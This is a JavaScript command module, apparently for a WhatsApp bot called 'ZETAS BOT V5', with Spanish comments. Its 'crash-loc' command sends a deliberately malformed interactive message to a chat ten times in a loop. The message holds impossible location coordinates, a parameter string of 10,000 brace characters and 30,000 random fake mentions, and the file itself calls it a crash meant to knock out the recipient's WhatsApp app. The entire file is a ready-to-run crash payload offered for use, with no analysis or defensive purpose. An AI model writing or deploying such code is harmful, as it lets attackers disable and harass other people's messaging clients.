
let handler = async (m, { conn }) => {
  let target = m.chat // grupo o privado

  m.reply(`☠️ Enviando crash a: ${target}...`)

  try {
    for (let i = 0; i < 10; i++) {
      await crash(conn, target)
      await delay(4000)
    }

    await conn.sendMessage(target, {
      text: "✅ 𝐂𝐑𝐀𝐒𝐇 𝐋𝐎𝐂 𝐄𝐍𝐕𝐈𝐀𝐃𝐎\n\n🔹 Por: 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛\n🔹 Bot: 𝐙𝐄𝐓𝐀𝐒 𝐁𝐎𝐓 𝐕𝟓",
    })

  } catch (e) {
    console.log("❌ Error al enviar crash:", e)
    m.reply("❌ Error enviando el crash.")
  }
}

handler.command = /^crash-loc$/i
export default handler

// ✅ FUNCIÓN ACTUALIZADA DE CRASH
async function crash(conn, target) {
  try {
    let message = {
      interactiveMessage: {
        header: {
          title: "𝐂𝐑𝐀𝐒𝐇 𝐇𝐎𝐌𝐄 😭",
          hasMediaAttachment: false,
          locationMessage: {
            degreesLatitude: -6666666666,
            degreesLongitude: 6666666666,
            name: "https://youtube.com/@p.a.zinwebkkkkj",
            address: "𝐙𝐄𝐓𝐀𝐒 𝐁𝐎𝐓 𝐕𝟓",
          },
        },
        body: {
          text: "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>",
        },
        nativeFlowMessage: {
          messageParamsJson: "{".repeat(10000),
        },
        contextInfo: {
          participant: target,
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 30000 }, () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            ),
          ],
        },
      },
    }

    await conn.relayMessage(target, { viewOnceMessage: { message } }, {
      messageId: generateMessageID(),
      userJid: target,
    })

  } catch (err) {
    console.log("❌ Error en crash:", err)
  }
}

// 👇 Delay
function delay(ms) {
  return new Promise(res => setTimeout(res, ms))
}

// 👇 Para evitar errores por falta de ID
function generateMessageID() {
  return Math.floor(Math.random() * 1e10).toString()
}